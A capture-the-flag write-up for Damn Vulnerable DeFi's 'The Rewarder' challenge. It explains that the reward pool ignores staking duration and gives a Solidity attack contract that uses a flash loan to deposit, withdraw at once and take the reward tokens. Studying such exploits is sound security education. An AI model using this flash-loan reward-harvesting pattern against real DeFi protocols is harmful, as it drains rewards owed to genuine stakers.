## Damn Vulnerable DeFi: The Rewarder Challenge Exploitation

Here, the primary vulnerability is in the reward distribution mechanism. The reward pool fails to check the duration for which tokens are staked when distributing rewards. This allows a user to deposit a large quantity of tokens, claim the rewards, and then promptly withdraw the tokens.

```solidity
contract AttackReward {
    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool rewardPool;
    address payable owner;

    constructor(
        address poolAddress,
        address liquidityTokenAddress,
        address rewardPoolAddress,
        address payable _owner
    ) {
        // Initializes the FlashLoanerPool, DamnValuableToken, TheRewarderPool, and owner.
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardPool = TheRewarderPool(rewardPoolAddress);
        owner = _owner;
    }

    function attack(uint256 amount) external {
        // Requests a flash loan from the pool.
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approves the reward pool to spend the borrowed funds.
        liquidityToken.approve(address(rewardPool), amount);

        // Deposits the borrowed funds in the reward pool, triggering reward distribution.
        rewardPool.deposit(amount);

        // Immediately withdraws the funds from the reward pool.
        // This is part of the vulnerability, as the attacker does not need to keep the funds staked.
        rewardPool.withdraw(amount);

        // Returns the borrowed funds back to the lending pool.
        liquidityToken.transfer(address(pool), amount);

        // Transfers the rewards obtained from the reward pool to the attacker's wallet.
        // This is the final step exploiting the vulnerability where the attacker obtains the rewards without staking their own funds.
        uint256 currBal = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, currBal);
    }
}
```

In the `attack` function, we initiate a flash loan for a specified amount. When the flash loan arrives, `receiveFlashLoan` is invoked. This function takes the flash loan amount, deposits it in the `rewardPool`, immediately withdraws it, and pays back the loan. Any rewards earned during this process are transferred to the `owner`.
